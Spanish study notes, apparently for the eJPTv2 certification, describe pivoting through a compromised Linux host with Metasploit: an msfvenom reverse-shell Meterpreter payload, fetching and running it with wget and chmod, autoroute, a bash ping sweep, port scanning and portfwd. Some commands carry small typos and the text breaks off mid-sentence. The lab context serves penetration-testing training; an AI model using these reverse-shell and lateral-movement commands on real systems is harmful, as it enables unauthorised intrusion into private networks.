Tendremos primero que conseguir una sesión de Meterpreter, para ello crearemos el siguiente Payload con msfvenom

````
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.138 LPORT=5555 -f elf -b '\x00\x0a\x0d' -o virus2
````

Posterior a esto tendremos que usar msfconsole para conectarnos al meterpreter.

![[2.1 PIVOTING.jpg]]

Tambien, dentro de la máquina comprometida tendremos que recibir el archivo mediante wget como se explico en [[eJPTv2/CONCEPTOS BÁSICOS/2. Compartir archivos con servidor http]] y darle permisos mediante `chomd +x nombre_archivo` y ejecutarlo con `./nombre_archivo`

NO PODREMOS HACER PIVOTING SIN SER ROOT.

Para conseguirlo hay que escalar privilegios con [[eJPTv2/6. ESCALADA DE PRIVILEGIOS/1. SUDO -l]].

RECOMENDABLE USAR `script /dev/null -c bash`

Una vez teniendo meterpreter y el usuario root.

Empezaremos por el comando `ipconfig` pasa saber las interfaces de red que tiene. Pasaremos la sesión de Meterpreter a segundo plano (CNTRL + Z)

Usaremos el siguiente modulo para enrutar el tráfico:

`use /multi/manage/autorute`

Indicando únicamente la SESSION.

Montaremos un pequeño script en bash para saber las máquinas que están dentro de la red y lo lanzaremos en el meterpreter. `session -i NUMERO_SESION`

````
#!/bin/bash

for i in {1..255}; do
        timeout 1 bash -c "ping -c 1 10.10.10.$i" >/dev/null
        if [ $? -eq 0 ]; then
                echo "El host 10.10.10.$i está activo"
        fi
done
````

Posterior a saber la IP tendremos que hacer un escaneo de puertos. Suspenderemos nuevamente la sesion de meterpreter (CNTRL + Z).

Buscaremos el módulo `use scanner/portscan/tcp`

![[2.2. PIVOTING.png]]

Pondremos el RHOSTS con la IP de la máquina objetivo. Haremos lo mismo que con el anterior si tuviéramos que ampliar el rango de puertos.

Para traernos los puertos tendremos que volver a entrar al meterpreter.

El comando a usar el siguiente:

`portfwd add -l PUERTO_DE_LA_MÁQUINA -p PUERTO_QUE_NOS_QUEREMOS_TRAER -r IP_DE_LA_MÁQUINA_FINAL`

Si ahora desde la kali hacemos un `ssh USER@127.0.0.1 -P PUERTO_INDICADO_ANTERIORMENTE`

Podremos acceder al usuario 